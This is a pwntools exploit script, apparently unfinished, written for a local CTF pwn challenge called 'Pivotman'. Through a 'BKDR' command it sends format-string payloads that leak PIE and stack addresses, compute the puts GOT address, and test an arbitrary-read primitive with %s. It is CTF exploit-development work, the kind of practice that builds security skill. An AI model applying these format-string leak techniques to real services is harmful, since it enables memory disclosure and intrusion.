#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

CHALL_DIR = '/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Pivotman/pwn_pivotman/challenge'
ELF_PATH = f'{CHALL_DIR}/chall'
LD_PATH = f'{CHALL_DIR}/ld-linux-x86-64.so.2'

p = process([LD_PATH, ELF_PATH], cwd=CHALL_DIR)

p.recvuntil(b' \r\n', timeout=5)
p.sendline(b'USER ;)')
p.recvuntil(b' \r\n')
p.sendline(b'PASS ;)')
p.recvuntil(b' \r\n')

# Leak PIE
p.sendline(b'BKDR %2737$p.%2736$p')
resp = p.recvuntil(b' \r\n')
marker = b' BKDR '
idx = resp.find(marker)
after = resp[idx + len(marker):]
parts = after.split(b'.')
pie_leak = int(parts[0], 16)
stack_leak = int(parts[1], 16)
pie_base = pie_leak - 0x3a10
saved_rbp = stack_leak
log.info(f'PIE: {hex(pie_base)}, saved_rbp: {hex(saved_rbp)}')

# Verify position 1032 contains the embedded address correctly
# Send: BKDR + 13 bytes padding + PTR + %1031$p.%1032$p.%1033$p
addr = pie_base + 0x5ed8  # puts@GOT
payload = b'BKDR ' + b'.' * 8 + b'%1032$p.%1033$p'
# Wait, need to recalculate
# Input: BKDR XXXXXXXXXXXX%1032$p (where X is padding to make addr at byte 13)
# "BKDR " = 5 bytes
# padding = bytes 5 to 12 = 8 bytes  
# "%1032$p.%1033$p" starts at byte 13
# So buffer[16] = input[13] = '%' 
# Position 1032 doesn't contain our address - the fmt spec does
# 
# Better: place a known value at position 1032 and verify
# Input: BKDR (5) + padding (8) + p64(0xDEADBEEFCAFE) (8) = bytes 13-20
# Then at buffer[16:24] = input[13:21] = p64(0xDEADBEEFCAFE) = position 1032
payload = b'BKDR ' + b'XXXXXXXX' + p64(0xDEADBEEFCAFE) + b'%1032$p'
log.info(f'Payload: {payload}')
p.sendline(payload)
resp = p.recvuntil(b' \r\n')
log.info(f'Position check: {resp}')

# Now test %s with this same address
p.sendline(b'BKDR ' + b'XXXXXXXX' + p64(0xDEADBEEFCAFE) + b'%1032$sA')
try:
    resp = p.recvuntil(b' \r\n', timeout=3)
    log.info(f'%s test: {resp}')
except:
    log.error('Crashed on %s')

p.close()
